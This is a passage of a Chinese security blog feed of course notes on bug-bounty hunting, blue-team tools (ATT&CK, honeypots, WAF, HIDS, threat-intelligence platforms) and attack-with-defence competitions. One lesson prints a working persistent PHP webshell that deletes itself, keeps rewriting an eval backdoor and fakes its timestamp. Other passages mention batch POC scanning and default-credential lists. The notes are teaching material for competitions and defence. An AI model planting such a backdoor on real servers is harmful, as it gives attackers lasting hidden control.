src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-7.png" alt="86-1"></p><p>对这3个网站使用poc自动化定点测试。</p><p>也可以去网上（<a href="https://github.com/TimelineSec/2020-Vulnerabilities%EF%BC%89%E5%B0%86%E6%9C%80%E8%BF%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%EF%BC%8C%E5%86%99python%E8%84%9A%E6%9C%AC%EF%BC%8C%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E3%80%82">https://github.com/TimelineSec/2020-Vulnerabilities）将最近的漏洞详情下载下来，写python脚本，批量检测。</a></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88SRC%E6%8C%96%E6%8E%98%EF%BC%89/86-8.png" alt="86-1"></p><p>注意：盒子、补天等众测平台的漏洞不能批量扫描，只能人工测试。</p><p><strong>案例3：Python-Foda-平台默认口令安全批量自动化</strong></p><p>思路与上述类似，下面网址列出来大部分设备的默认口令：</p><p><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;86-SRC挖掘-教育行业平台&amp;amp;规则&amp;amp;批量自动化&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E8%93%9D%E9%98%9Fatt&amp;ck&amp;IDS&amp;%E8%9C%9C%E7%BD%90&amp;%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</id>
    <published>2023-05-23T15:15:21.170Z</published>
    <updated>2023-06-06T15:39:00.525Z</updated>
    
    <content type="html"><![CDATA[<p>82-红蓝对抗-蓝队att&amp;ck&amp;IDS&amp;蜜罐&amp;威胁情报</p><span id="more"></span><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-1.png" alt="80-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-2.png" alt="80-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-3.png" alt="80-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-4.png" alt="80-1"></p><p>必备知识点：</p><p>在每年的安全活动中，红蓝队的职责，其中大部分强调学习红队技术，那么蓝队技术又有哪些呢？简要来说蓝队就是防守，涉及到应急、溯源、反制、情报等综合性认知和操作能力知识点。掌握红队攻击技术的前提下，蓝队技术能提升一个档次哦。</p><p>本课知识点：</p><ol><li>认识ATT&amp;CK框架技术</li><li>认识对抗的蜜罐技术的本质</li><li>掌握WAF安全产品部署及应用</li><li>掌握IDS在对抗中的部署使用</li><li>掌握威胁情报平台对应报告分析</li><li>作为一名干饭人要掌握的报告书写专业性</li></ol><p>本课重点：</p><ul><li>案例1：专业用语-ATT&amp;CK技术简要介绍-报告书写</li><li>案例2：掌握了解-安全攻防蜜罐技术的利用-配合威胁</li><li>案例3：攻击拦截-WAF安全产品部署及反制-多种中间件</li><li>案例4：追踪反制-HIDS入侵检测系统部署测试-爆破|提权|规则</li><li>案例5：应急溯源-威胁情报平台对于溯源分析意义-CS后门溯源</li></ul><p><strong>案例1：专业用语-ATT&amp;CK技术简要介绍-报告书写</strong></p><p>原版：<a href="https://attack.mitre.org/matrices/enterprise">https://attack.mitre.org/matrices/enterprise</a></p><p>国内有ATT&amp;CT参考手册，可以下载参考学习。</p><p><strong>案例2：掌握了解-安全攻防蜜罐技术的利用-配合威胁</strong></p><p>Hfish部署配合在线威胁平台实现自动分析，记录攻击者攻击手法及攻击过程，攻击IP等信息可作为黑名单。</p><p><a href="https://hfish.io/index.html">https://hfish.io/index.html</a></p><p><a href="https://github.com/hacklcx/HFish">https://github.com/hacklcx/HFish</a></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-5.png" alt="80-1"></p><p><strong>案例3：攻击拦截-WAF安全产品部署及反制-多种中间件</strong></p><p>Openrasp-PHP,Java网站应用防护，多种中间件</p><p><a href="https://rasp.baidu.com/doc/">https://rasp.baidu.com/doc/</a></p><p>安全狗支持的中间件比较少，推荐使用Openrasp。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-6.png" alt="80-1"></p><p>部署OpenRasp之后，网站数据包会携带请求头X-Protected-By:OpenRasp，我们测试的时候可以留意一下。</p><p>还有默安和长亭蜜罐。</p><p><strong>案例4：追踪反制-HIDS入侵检测系统部署测试-爆破|提权|规则</strong></p><p>NIDS&amp;HIDS</p><ul><li>NIDS：网络入侵检测系统</li><li>HIDS：主机入侵检测系统</li></ul><p>这里介绍两款HIDS：yulong-hids（国产）、wazuh（国外，推荐）</p><ul><li><p>yulong-hids：优点：中文规则说明等-规则</p></li><li><ul><li><a href="https://github.com/ysrc/yulong-hids">https://github.com/ysrc/yulong-hids</a></li></ul></li><li><p>wazuh：ELK日志，攻击行为分析等-爆破|提权</p></li><li><ul><li>实现入侵行为分析，日志实时监控，规则触发拦截等功能</li><li><a href="https://documentation.wazuh.com/4.0/index.html">https://documentation.wazuh.com/4.0/index.html</a></li></ul></li></ul><p>驭龙HIDS规则引擎（可自己添加规则）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-7.png" alt="80-1"></p><p><strong>案例5：应急溯源-威胁情报平台对于溯源分析意义-CS后门溯源</strong></p><p>参考：值得推荐的威胁情报平台–2020.10更新 <a href="https://blog.csdn.net/qq_29277155/article/details/79830927">https://blog.csdn.net/qq_29277155/article/details/79830927</a></p><p>威胁情报是指：基于一定知识的证据，已经存在或正在形成的潜在威胁，比如，上下文、机制、指标、意义以及可实施的建议，利用这些，可以帮助当事人形成应对这些危险的决策。</p><p>预测（基于数据）将要来临的的攻击。威胁情报利用公开的可用资源，预测潜在的威胁。网络威胁情报可以帮助你在防御方面做出更好的决策，可以得到以下好处。</p><ul><li>组建一个安全预警机制，在攻击发起之前知道它</li><li>对安全事件提出更好的解决方案</li><li>网络威胁情报为你提供最新的安全技术信息，帮助封锁出现的威胁</li><li>对相关的危险进行调查，开展利益分析</li><li>要寻找什么：恶意IP地址、域名&#x2F;网站、文件哈希（恶意软件分析）、受害领域&#x2F;国家</li></ul><p>威胁情报平台</p><ul><li><p>微步威胁平台：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></li><li><ul><li>中国首家专业的威胁情报公司。它是国内第一个综合性的威胁分析平台，秉承公开、免费、自由注册的原则，为全球的安全分析人员提供了一个便利的一站式威胁分析平台，用来进行事件响应过程的工作，包括：事件确认、危险程度和影响分析、关联及溯源分析等。</li><li>主要特征如下：自由公开的服务、多引擎文件检测、行为沙箱、集成互联网基础数据、集成开源情报信息、关联分析、机器学习、可视化分析</li></ul></li><li><p>奇安信威胁情报中心：<a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p></li><li><ul><li>360 Alpha威胁分析平台，是360企业安全为安全分析师提供一站式分析工具（云端SaaS平台），具备完备的威胁情报和互联网基础数据，在数据覆盖度、信息种类、数据的时间&#x2F;空间跨度都具备较大优势。</li><li>在功能方面，Alpha平台包括有4大模块：威胁研判模块可以直接判定报警真实性、了解攻击团伙&#x2F;软件的意图和能力，进而快速筛选出真实、重要的报警；威胁关联分析模块，针对无法直接判定的分析对象，可一键自动化分析域名、IP、注册信息和样本间的关联信息，同时还可以生成攻击者画像信息；文件深度分析模块，用于了解恶意软件的详细的静态、动态行为，并提取IOC形成自己的威胁情报；分析任务管理模块可以将一次攻击事件所涉及到的域名、IP、样本等信息进行整合并统一管理，后续还可以依照标准威胁情报格式STIX，进行威胁情报分享。</li></ul></li><li><p>360威胁情报中心 <a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></p></li><li><ul><li>360旗下的威胁情报中心，可以根据IP、Domain、 HASH(MD5,SHA1,SHA256)、CA(MD5,SHA1,SHA256,SKID)查询威胁情报。</li></ul></li><li><p>绿盟 威胁情报中心：<a href="https://nti.nsfocus.com/">https://nti.nsfocus.com/</a></p></li><li><ul><li>绿盟科技旗下的威胁情报中心，支持中文搜索，但是需要注册登录查看更多的信息</li><li>主要特征如下：输入客户名称、安全事件名称、攻击组织名称、攻击工具名称、IPv4、IPv6、域名、漏洞名称&#x2F;编号、文件Hash（MD5&#x2F;SHA256） 或任意关键字</li></ul></li><li><p>VenusEye威胁情报中心：<a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></p></li><li><ul><li>VenusEye威胁情报中心是由启明星辰集团倾力打造的集威胁情报收集、分析、处理、发布和应用为一体的威胁情报云服务平台，提供威胁情报数据、系统、技术和专业能力的输出。</li><li>主要特征如下：IP、域名、文件HASH(MD5&#x2F;SHA1&#x2F;SHA256)、邮箱、证书指纹（SHA1）</li></ul></li><li><p>安恒威胁情报中心 ：<a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></p></li><li><ul><li>提供海量内外部威胁情报数据、恶意样本行为数据、黑客组织画像信息等查询服务， 帮助安全运营者对攻击报警进行研判，通过多源情报关联信息， 挖掘攻击事件背后的动机</li><li>主要特征如下：域名、IP、邮箱、文件Hash、字符串</li></ul></li><li><p>360网络安全研究：<a href="http://netlab.360.com/">http://netlab.360.com/</a></p></li><li><ul><li>360旗下的安全实验室，擅长从全球流量动态分析漏洞蠕虫木马等恶意攻击行为，并且联合历史流量、情报信息进行综合分析。</li><li>主要特征如下：被动DNS检测（<a href="https://passivedns.cn/%EF%BC%89%E3%80%81DDOS%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB%E7%BA%AA%E5%BD%95%EF%BC%88https://ddosmon.net/%EF%BC%89%E3%80%81%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7%EF%BC%88https://scan.netlab.360.com/%EF%BC%89%E3%80%81%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%EF%BC%88EK">https://passivedns.cn/）、DDOS恶意攻击纪录（https://ddosmon.net/）、网络扫描行为监控（https://scan.netlab.360.com/）、开源情报信息（EK</a>, DNS DGA, MalConn(sample network behaviour), Mirai scanner, Mirai C2 and DRDoS Reflector）（<a href="https://scan.netlab.360.com/%EF%BC%89">https://scan.netlab.360.com/）</a></li></ul></li><li><p>AlienVault : <a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></p></li><li><ul><li>可以访问威胁研究专家和安全专家全球社区。它递送社区产生的威胁数据，能够协作各个来源的威胁数据，自动更新你的安全基础设施。其收购了threatcrowd，拥有IP、域名、文件、邮件等情报</li><li>主要特征如下：垃圾和钓鱼页面、恶意软件和间谍软件、匿名代理攻击和P2P网络、暗网IP地址（使用TOR）、管理僵尸网络的C&amp;C服务器、域名、IP地址、邮件地址、文件哈希、杀软检测（<a href="https://www.threatcrowd.org/%EF%BC%89">https://www.threatcrowd.org/）</a></li></ul></li><li><p>ISC SANS威胁检测： <a href="https://isc.sans.edu/">https://isc.sans.edu/</a></p></li><li><ul><li>在成功检测，分析和发布Li0n蠕虫警告后，ISC于2001年创建， 今天，ISC为成千上万的互联网用户和组织提供免费的分析和警告服务，并且正在积极与互联网服务提供商合作，以打击最恶意的攻击者。</li><li>主要特征如下：关键词、IP、域名、页头</li></ul></li><li><p>RedQueen安全智能服务平台：<a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></p></li><li><ul><li>天际友盟的情报应用解决方案已在国内多家政府机构，以及金融、互联网、通信、能源等行业的多家龙头企业得到实践，通过综合应用多项业内领先的情报应用技术，为服务的客户切实解决了多项重点、难点安全问题，辅助企业持续完善安全体系，提升安全能力，彰显安全价值。</li><li>未来，天际友盟还将继续秉承“应用安全情报，解决实际问题”的品牌理念，从客户的实际问题出发，深耕安全情报技术的实践应用，与客户及众多合作伙伴一道，为打造更安全的未来而努力。</li><li>主要特征如下：安全情报、漏洞情报、最新资讯、威胁溯源、自由公开的服务、集成互联网基础数据、集成开源情报信息、关联分析、机器学习、可视化分析</li></ul></li><li><p>IBM情报中心：<a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></p></li><li><ul><li>BM X-Force Exchange 是一款基于云的威胁情报共享平台，支持使用、共享威胁情报并采取行动。它支持快速搜索全球最新安全威胁，汇总可操作情报、向专家咨询并与同行进行合作。IBM X-Force Exchange 由人员和机器生成的情报支持，可利用 IBM X-Force 的规模来帮助用户在新兴威胁面前保持领先地位。</li></ul></li></ul><p>威胁情报一直是安全行业热议的话题，实际上在国内的发展还比较初级。威胁情报具有优秀的预警能力、快速响应能力，并且能改善管理层之间的沟通、加强策略规划和投资。但是大部分企业机构并不具备充分利用威胁情报的能力：1.数据量太大且过于复杂；2.拥有相关知识的人才匮乏。</p><ul><li>日常应用：在安全事件、应急响应中，获取威胁情报，作为重要证据，辅助事件处置</li><li>高级应用：集成到企业安全管理平台提高监控预警响应能力、结合威胁数据和其他解决方案实现数据安全、优秀的数据展示功能</li><li>github链接：<a href="https://github.com/ym2011/SecurityTechnique/blob/master/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5.xmind">https://github.com/ym2011/SecurityTechnique/blob/master/威胁情报/威胁情报.xmind</a></li></ul><p>案例演示</p><p>利用CobaltStrike生成的后门文件进行平台分析展示</p><p>利用威胁情报平台实现对未知文件及未知URL等信息进行分析溯源</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/82-8.png" alt="80-1"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;82-红蓝对抗-蓝队att&amp;amp;ck&amp;amp;IDS&amp;amp;蜜罐&amp;amp;威胁情报&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E7%9B%91%E6%8E%A7&amp;%E4%B8%8D%E6%AD%BB%E9%A9%AC&amp;%E5%9E%83%E5%9C%BE%E5%8C%85&amp;%E8%B5%84%E6%BA%90%E5%BA%93/</id>
    <published>2023-05-23T15:11:59.107Z</published>
    <updated>2023-06-06T15:38:43.465Z</updated>
    
    <content type="html"><![CDATA[<p>81-红蓝对抗-AWD监控&amp;不死马&amp;垃圾包&amp;资源库</p><span id="more"></span><p><strong>本课重点：</strong></p><ul><li>案例1：防守-流量监控-实时获取访问数据包流量</li><li>案例2：攻击-权限维持-不死脚本后门生成及查杀</li><li>案例3：其他-恶意操作-搅屎棍发包回首掏共权限</li><li>案例4：准备-漏洞资源-漏洞资料库及脚本工具库</li></ul><p><strong>案例1：防守-流量监控-实时获取访问数据包流量</strong></p><p>利用 WEB 访问监控配合文件监控能实现 WEB 攻击分析及后门清除操作，确保写入后门操作失效，也能确保分析到无后门攻击漏洞的数据包便于后期利用。</p><p>上传文件监控脚本log-record.php，该脚本需要在网站配置文件footer.php中包含一下，否则无法正常调用运行。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81-1.png" alt="80-1"></p><p>之后一旦有人访问了系统，它就会在&#x2F;tmp&#x2F;目录下生成一个log日志。</p><p>接下来我们就可以实时监控该日志。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81-2.png" alt="80-1"></p><p>分析日志，就可以知道别人对自己网站实施了哪些攻击，若攻击成功，说明有漏洞。相应的可以对其进行防护，也可以利用该攻击方法去攻击别人。</p><ul><li>1.分析有后门或无后门的攻击行为数据包找到漏洞进行修复</li><li>2.分析到成功攻击的数据包进行自我利用，用来攻击其他队伍</li></ul><p><strong>案例2：攻击-权限维持-不死脚本后门生成及查杀</strong></p><p>在攻击利用后门获取 Flag 时，不死后门的权限维持尤为重要，同样防守方也要掌握对其不死后门的查杀和利用，这样才能获取更高的分数，对比文件监控前后问题。</p><p>不死马.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//进程运行</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如何杀死不死马？</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81-3.png" alt="80-1"></p><p>monitor.py开启之前，写入不死后门，monitor.py无法对其查杀，不死后门有作用；</p><p>monitor.py开启之后，写入不死后门，monitor.py可以对其查杀，不死后门无作用。</p><p><strong>案例3：其他-恶意操作-搅屎棍发包回首掏共权限</strong></p><p>作为各种技术大家都要用的情况下，一个好的攻击漏洞和思路不被捕获和发现，一个好的套路浪费对手的时间，搅屎棍发包回首掏共权限利用思路可以尝试使用。</p><p>搅屎棍脚本</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/81-4.png" alt="80-1"></p><p>回首掏：配合抓到的真实攻击数据包，利用数据包占用其他人的攻击行为。利用后门去连接其他团队尝试。</p><p><strong>案例4：准备-漏洞资源-漏洞资料库及脚本工具库</strong></p><p>比赛准备：如何收集并整理好漏洞，文档资料，脚本工具等</p><ul><li><p>漏洞库：exploitdb，github 监控最新信息，平常自己收集整理</p></li><li><ul><li><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></li></ul></li><li><p>文档资料：零组类似文档离线版爬虫，各类资料，平常自己收集整理</p></li><li><p>脚本工具：忍者系统配合自己常用工具，github 监控 awd 脚本，收集整理</p></li><li><ul><li>github搜索awd，有很多最新脚本</li></ul></li></ul><p>涉及资源：</p><ul><li>AWD平台搭建 <a href="https://blog.csdn.net/weixin_30367873/article/details/99608419">https://blog.csdn.net/weixin_30367873/article/details/99608419</a></li><li>AWD红蓝对抗资料工具 <a href="https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ">https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ</a> 提取码：xiao</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;81-红蓝对抗-AWD监控&amp;amp;不死马&amp;amp;垃圾包&amp;amp;资源库&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>80-红蓝对抗-AWD模式&amp;准备&amp;攻防&amp;监控&amp;批量</title>
    <link href="http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E6%A8%A1%E5%BC%8F&amp;%E5%87%86%E5%A4%87&amp;%E6%94%BB%E9%98%B2&amp;%E7%9B%91%E6%8E%A7&amp;%E6%89%B9%E9%87%8F/"/>
    <id>http://blog.hvvl404.fun/2023/05/23/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-AWD%E6%A8%A1%E5%BC%8F&amp;%E5%87%86%E5%A4%87&amp;%E6%94%BB%E9%98%B2&amp;%E7%9B%91%E6%8E%A7&amp;%E6%89%B9%E9%87%8F/</id>
    <published>2023-05-23T15:08:42.869Z</published>
    <updated>2023-06-06T15:38:38.901Z</updated>
    
    <content type="html"><![CDATA[<p>80-红蓝对抗-AWD模式&amp;准备&amp;攻防&amp;监控&amp;批量</p><span id="more"></span><p>思维导图</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80-1.png" alt="80-1"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88AWD%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%EF%BC%89/80-2.png" alt="80-1"></p><p>AWD 常见比赛规则说明：</p><ul><li>Attack With Defence，简而言之就是你既是一个 hacker，又是一个 manager。</li><li>比赛形式：一般就是一个 ssh 对应一个 web 服务，然后 flag 五分钟一轮，各队一般都有自己的初始分数，flag 被拿会被拿走 flag 的队伍均分，主办方会对每个队伍的服务进行 check，check 不过就扣分，扣除的分值由服务 check 正常的队伍均分。其中一半比赛以 WEB 居多，可能会涉及内网安全。攻击和防御大部分为前期培训内容。</li></ul><p>前期准备：</p><ul><li>1.队伍分工明确</li><li>2.脚本工具环境完整</li><li>3.漏洞 POC&#x2F;EXP 库完整</li><li>4.安全防御 WAF 及批量脚本完整</li></ul><p>必备操作：</p><ul><li>1 备份网站文件</li><li>2 修改数据库默认密码</li><li>3 修改网页登陆端一切弱密码</li><li>4 查看是否留有后门账户</li><li>5 关闭不必要端口，如远程登陆端口</li><li>6 使用命令匹配一句话特性</li><li>7 关注是否运行了“特殊”进程</li><li>8 权限高可以设置防火墙或者禁止他人修改本目录</li></ul><p>本课重点：</p><ul><li>案例1：防守-部署 WAF-实现第一时间拦截部分攻击-升级后续版</li><li>案例2：防守-扫描后门-实现第一时间利用预留后门攻击-升级脚本版</li><li>案例3：防守-代码审计-实现第一时间找出源码中安全漏洞-升级漏洞库版</li><li>案例4：防守-文件监控-实现第一时间监控当前目录文件操作-升级流量监控</li><li>案例5：攻击-批量Flag-实现第一时间利用脚本批量 Flag 得分-升级模版不死马</li></ul><p><strong>案例1：防守-部署 WAF-实现第一时间拦截部分攻击-升级后续版</strong></p><p>最快第一时间操作，此类技术核心准备为各个环境的 WAF 部署(源码语言，比赛规则)</p><p>涉及资源：</p><ul><li><a href="https://github.com/zhl2008/awd-platform">https://github.com/zhl2008/awd-platform</a></li><li><a href="https://github.com/yemoli/prepare-for-awd">https://github.com/yemoli/prepare-for-awd</a></li><li><a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></li><li><a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></li><li>AoiAWD-针对CTF AWD的原创轻量级防御系统 <a href="https://mp.weixin.qq.com/s/kwzJnoi2FwFhwbdxetd45A">https://mp.weixin.qq.com/s/kwzJnoi2FwFhwbdxetd45A</a></li><li>AWD平台搭建 <a href="https://www.cnblogs.com/Triangle-security/p/11332223.html">https://www.cnblogs.com/Triangle-security/p/11332223.html</a></li><li>AWD红蓝对抗资料工具 <a href="https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ%E6%8F%90%E5%8F%96%E7%A0%81:xiao">https://pan.baidu.com/s/1qR0Mb2ZdToQ7A1khqbiHuQ提取码:xiao</a></li><li>线下AWD平台搭建以及一些相关问题解决 <a 